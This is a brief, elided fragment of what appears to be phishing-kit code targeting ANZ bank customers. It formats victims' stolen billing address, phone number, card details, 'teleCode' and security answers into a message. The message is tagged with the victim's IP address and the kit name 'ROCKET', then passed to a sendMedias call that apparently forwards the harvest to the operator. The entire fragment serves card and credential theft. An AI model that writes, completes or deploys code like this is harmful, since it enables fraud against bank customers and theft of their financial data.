...
<p>(▰˘◡˘▰) ADDRESS ☞ <b>${JSON.parse(values.billing[0]).address}</b></p>
<p>(▰˘◡˘▰) PHONE NUMBER ☞ <b>${
...
<p>(▰˘◡˘▰) TELECODE ☞ <b>${JSON.parse(values.cardDetails[0]).teleCode}</b></p>`
    : ``
}
${
  values.answers
...
<div>------------------------------------</div>
    ...
    await sendMedias(
      message,
      `ANZ | ${values.form} by ROCKET 🚀 From ${String(ip).split(`,`)[0]}`,
